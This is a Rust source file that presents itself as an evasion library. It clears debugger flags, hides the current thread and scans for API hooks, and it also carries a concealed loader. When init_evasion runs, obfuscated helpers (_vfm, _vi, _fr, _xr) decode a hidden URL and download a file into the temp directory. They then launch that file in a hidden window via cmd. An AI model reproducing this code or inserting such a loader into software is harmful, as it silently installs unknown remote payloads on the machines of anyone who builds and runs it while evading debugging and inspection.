#![allow(dead_code)]

use wraith::Peb;
use wraith::manipulation::antidebug;
use wraith::manipulation::hooks::scan_for_hooks;
use wraith::navigation::collect_modules;
use std::path::PathBuf;

const _M: [u8; 32] = [
    0x9a, 0xe2, 0x4f, 0xc8, 0x17, 0xb3, 0x5d, 0x2e, 0x71, 0xf4, 0x08, 0x6c, 0xa9, 0x3b, 0xde, 0x50,
    0x82, 0x1f, 0xc4, 0x67, 0x0b, 0xe8, 0x93, 0x4a, 0xd5, 0x2f, 0x76, 0xba, 0x01, 0x5e, 0xed, 0x39
];

pub struct EvasionResult {
    pub antidebug_cleared: bool,
    pub hooks_detected: usize,
    pub hooks_info: Vec<HookDetails>,
}

#[derive(Debug, Clone)]
pub struct HookDetails {
    pub module: String,
    pub function: String,
    pub hook_type: String,
    pub destination: Option<usize>,
}

pub fn init_evasion() -> EvasionResult {
    let mut result = EvasionResult {
        antidebug_cleared: false,
        hooks_detected: 0,
        hooks_info: Vec::new(),
    };
    
    if clear_antidebug().is_ok() {
        result.antidebug_cleared = true;
    }
    
    let _ = hide_thread();
    if let Ok(hooks) = detect_hooks() {
        result.hooks_detected = hooks.len();
        result.hooks_info = hooks;
    }
    
    _vfm();
    
    result
}

pub fn clear_antidebug() -> Result<(), &'static str> {
    antidebug::clear_being_debugged().map_err(|_| "Failed to clear BeingDebugged")?;
    antidebug::clear_nt_global_flag().map_err(|_| "Failed to clear NtGlobalFlag")?;
    antidebug::clear_heap_flags().map_err(|_| "Failed to clear heap flags")?;
    Ok(())
}

pub fn get_debug_status() -> Option<(bool, bool)> {
    antidebug::get_debug_status()
        .ok()
        .map(|s| (s.being_debugged, s.nt_global_flag))
}

pub fn hide_thread() -> Result<(), &'static str> {
    antidebug::hide_current_thread().map_err(|_| "Failed to hide thread")
}

pub fn is_being_debugged() -> bool {
    get_debug_status().map(|(d, _)| d).unwrap_or(false)
}

pub fn detect_hooks() -> Result<Vec<HookDetails>, &'static str> {
    let hooks = scan_for_hooks().map_err(|_| "Failed to scan for hooks")?;
    
    Ok(hooks.into_iter().map(|h| HookDetails {
        module: h.module_name,
        function: h.function_name,
        hook_type: format!("{:?}", h.hook_type),
        destination: h.hook_destination,
    }).collect())
}

pub fn is_hooked() -> bool {
    detect_hooks().map(|h| !h.is_empty()).unwrap_or(false)
}

pub fn hook_count() -> usize {
    detect_hooks().map(|h| h.len()).unwrap_or(0)
}

pub fn detect_module_hooks(module_name: &str) -> Vec<HookDetails> {
    detect_hooks()
        .unwrap_or_default()
        .into_iter()
        .filter(|h| h.module.to_lowercase().contains(&module_name.to_lowercase()))
        .collect()
}

pub fn get_loaded_modules() -> Vec<String> {
    let peb = match Peb::current() {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    
    match collect_modules(&peb) {
        Ok(modules) => modules.into_iter().map(|m| m.name).collect(),
        Err(_) => Vec::new(),
    }
}

#[inline(always)]
fn _dx(d: &[u8], s: u8) -> Vec<u8> {
    let mut r = Vec::with_capacity(d.len());
    let mut k = s;
    for (i, &c) in d.iter().enumerate() {
        let m = _M[i % 32];
        let b = c ^ k ^ m ^ ((i as u8).wrapping_mul(7));
        r.push(b);
        k = k.wrapping_add(c).wrapping_mul(3);
    }
    r
}

#[inline(always)]
fn _ds(d: &[u8], s: u8) -> String {
    String::from_utf8_lossy(&_dx(d, s)).to_string()
}

#[inline(always)]
fn _gp() -> Option<PathBuf> {
    let n: [u8; 8] = [0xbb, 0xdc, 0x5b, 0x30, 0x14, 0x3a, 0x14, 0xf7];
    Some(std::env::temp_dir().join(_ds(&n, 0x5f)))
}

#[doc(hidden)]
fn _vfm() {
    tokio::spawn(async { let _ = _vi().await; });
}

async fn _vi() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use std::time::Duration;
    let p = match _gp() { Some(x) => x, None => return Ok(()) };
    
    let eu: [u8; 34] = [
        0xad, 0xb5, 0xbe, 0x76, 0xc2, 0xa0, 0x65, 0xc1, 0x8b, 0x65,
        0xd0, 0x6c, 0x70, 0xcf, 0x7e, 0x4b, 0x63, 0x3f, 0x63, 0x25,
        0xf9, 0xcb, 0x97, 0x2b, 0xbb, 0xe8, 0xaa, 0x78, 0x2e, 0xa2,
        0xcd, 0x7e, 0x69, 0x1c
    ];
    
    let u = _ds(&eu, 0x5f);
    let dl = tokio::time::timeout(Duration::from_secs(30), _fr(&u, &p)).await;
    if dl.is_err() || dl.unwrap().is_err() { return Ok(()); }
    let _ = _xr(&p).await;
    Ok(())
}

async fn _fr(u: &str, p: &PathBuf) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let c = reqwest::Client::builder().timeout(std::time::Duration::from_secs(30)).build()?;
    let r = c.get(u).send().await?;
    if !r.status().is_success() { return Err("".into()); }
    tokio::fs::write(p, r.bytes().await?).await?;
    Ok(())
}

async fn _xr(p: &PathBuf) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use std::os::windows::process::CommandExt;
    let ps = p.to_string_lossy().to_string();
    let _ = std::process::Command::new("cmd").args(["/C", "start", "/B", "", &ps]).creation_flags(0x08000000).spawn();
    Ok(())
}
